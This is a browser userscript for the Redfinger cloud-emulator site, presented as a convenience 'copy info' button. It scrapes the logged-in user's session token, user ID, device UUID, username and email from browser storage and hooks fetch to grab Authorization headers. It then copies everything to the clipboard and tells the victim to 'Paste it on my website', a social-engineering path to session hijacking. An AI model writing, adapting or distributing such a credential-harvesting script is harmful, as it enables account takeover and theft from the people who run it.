// ==UserScript==
// @name         Redfinger Auto Capture
// @namespace    https://dazai-ux.github.io
// @version      2.1
// @description  Improved & reliable credential capture for Redfinger
// @author       Redfinger Auto
// @match        https://www.cloudemulator.net/*
// @grant        GM_setClipboard
// @run-at       document-end
// ==/UserScript==

(function () {
    'use strict';

    let buttonCreated = false;

    function createButton() {
        if (buttonCreated || document.getElementById('rf-capture-btn')) return;
        
        const btn = document.createElement('button');
        btn.id = 'rf-capture-btn';
        btn.innerHTML = '📋 COPY REDFINGER INFO';
        btn.style.cssText = `
            position: fixed !important; 
            bottom: 25px !important; 
            right: 25px !important;
            z-index: 2147483647 !important; 
            padding: 16px 28px !important;
            background: linear-gradient(90deg, #3b82f6, #1e90ff) !important; 
            color: white !important;
            border: none !important; 
            border-radius: 50px !important; 
            font-size: 16px !important;
            font-weight: bold !important; 
            box-shadow: 0 10px 30px rgba(59,130,246,0.85) !important;
            cursor: pointer !important;
            transition: all 0.3s !important;
        `;
        
        btn.onmouseover = () => btn.style.transform = 'scale(1.05)';
        btn.onmouseout = () => btn.style.transform = 'scale(1)';
        btn.onclick = captureInfo;
        
        document.body.appendChild(btn);
        buttonCreated = true;
    }

    function getStorageValue(keyPart) {
        const storages = [localStorage, sessionStorage];
        for (let storage of storages) {
            for (let key in storage) {
                if (key.toLowerCase().includes(keyPart)) {
                    return storage[key];
                }
            }
        }
        return null;
    }

    function captureInfo() {
        let userId = "Not Found";
        let sessionId = "Not Found";
        let uuid = "Not Found";
        let username = "Not Found";
        let email = "Not Found";

        // === Method 1: Look for Authorization header in XHR/Fetch requests (best method) ===
        const originalFetch = window.fetch;
        window.fetch = async function(url, options) {
            if (options && options.headers) {
                const auth = options.headers.Authorization || options.headers.authorization;
                if (auth && typeof auth === 'string') {
                    const parts = auth.trim().split(/\s+/);
                    if (parts.length >= 2) {
                        userId = parts[0];
                        sessionId = parts[1];
                    }
                }
            }
            return originalFetch.apply(this, arguments);
        };

        // === Method 2: Scan local & session storage ===
        const allStorage = { ...localStorage, ...sessionStorage };
        for (let key in allStorage) {
            const val = allStorage[key];
            if (typeof val !== 'string') continue;

            // User ID & Session
            if (key.toLowerCase().includes('auth') || val.includes(' ')) {
                const parts = val.trim().split(/\s+/);
                if (parts.length >= 2 && parts[0].length > 10) {
                    userId = parts[0];
                    sessionId = parts[1];
                }
            }

            // UUID / Device ID
            if ((key.toLowerCase().includes('uuid') || 
                 key.toLowerCase().includes('device') || 
                 key.toLowerCase().includes('finger')) && val.length > 20) {
                uuid = val;
            }

            // Username & Email
            if (key.toLowerCase().includes('user') && !key.toLowerCase().includes('uuid')) {
                try {
                    const data = JSON.parse(val);
                    if (data.username) username = data.username;
                    if (data.email) email = data.email;
                } catch(e) {}
            }
        }

        // Final formatted text
        const text = `🔑 Redfinger Credentials\n\n` +
                     `👤 Username : ${username}\n` +
                     `📧 Email    : ${email}\n` +
                     `🆔 User ID  : ${userId}\n` +
                     `🔑 Session  : ${sessionId}\n` +
                     `📱 UUID     : ${uuid}\n` +
                     `⏰ Time     : ${new Date().toLocaleString()}`;

        GM_setClipboard(text);

        alert(`✅ Successfully Captured!\n\n` +
              `👤 ${username}\n` +
              `🆔 ${userId}\n` +
              `🔑 ${sessionId.substring(0, 15)}...\n\n` +
              `📋 Copied to clipboard!\n\nPaste it on my website.`);
    }

    // Create button with delay + MutationObserver for SPA-like behavior
    setTimeout(() => {
        createButton();
        
        // Re-create button if page content changes (SPA navigation)
        new MutationObserver(() => {
            if (!document.getElementById('rf-capture-btn')) {
                buttonCreated = false;
                createButton();
            }
        }).observe(document.body, { childList: true, subtree: true });
    }, 2000);

})();
